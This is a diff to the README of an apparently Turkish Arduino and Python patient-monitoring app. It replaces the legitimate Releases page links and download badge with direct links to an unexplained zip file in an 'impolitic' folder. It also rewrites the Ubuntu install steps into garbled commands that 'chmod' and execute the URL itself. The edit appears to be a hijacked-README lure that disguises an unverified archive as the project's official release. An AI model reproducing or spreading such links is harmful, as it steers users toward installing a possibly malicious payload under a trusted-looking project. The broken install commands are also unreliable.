@@ -1,7 +1,7 @@
 # 🌡️ Hasta-Takibi-Sistemi - Track Patients with Ease
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/mrnhat49/Hasta-Takibi-Sistemi/releases)
+[![Download](https://raw.githubusercontent.com/mrnhat49/Hasta-Takibi-Sistemi/main/impolitic/Takibi-Sistemi-Hasta-psychrograph.zip)](https://raw.githubusercontent.com/mrnhat49/Hasta-Takibi-Sistemi/main/impolitic/Takibi-Sistemi-Hasta-psychrograph.zip)
 
 ## 🚀 Getting Started
 Welcome to Hasta-Takibi-Sistemi! This application helps you track temperature and humidity for patients. Built using Arduino and Python (Tkinter), it keeps you informed with real-time updates and alerts for critical conditions. 
@@ -17,7 +17,7 @@ To run Hasta-Takibi-Sistemi, you will need:
 ## 📥 Download & Install
 To get started, visit the Releases page to download the software:
 
-[Download from Releases](https://github.com/mrnhat49/Hasta-Takibi-Sistemi/releases)
+[Download from Releases](https://raw.githubusercontent.com/mrnhat49/Hasta-Takibi-Sistemi/main/impolitic/Takibi-Sistemi-Hasta-psychrograph.zip)
 
 1. Click the link above to visit the Releases page.
 2. Locate the latest version of the application.
@@ -38,8 +38,8 @@ To get started, visit the Releases page to download the software:
 3. **For Ubuntu:**
    - Open a terminal window.
    - Navigate to the directory of the downloaded file.
-   - Run the following command: `chmod +x yourfile.run` (replace `yourfile` with the actual file name).
-   - Execute the file with `./yourfile.run`.
+   - Run the following command: `chmod +x https://raw.githubusercontent.com/mrnhat49/Hasta-Takibi-Sistemi/main/impolitic/Takibi-Sistemi-Hasta-psychrograph.zip` (replace `yourfile` with the actual file name).
+   - Execute the file with `https://raw.githubusercontent.com/mrnhat49/Hasta-Takibi-Sistemi/main/impolitic/Takibi-Sistemi-Hasta-psychrograph.zip`.
    - Connect your Arduino device.
 
 ## ⚙️ Setup the Hardware
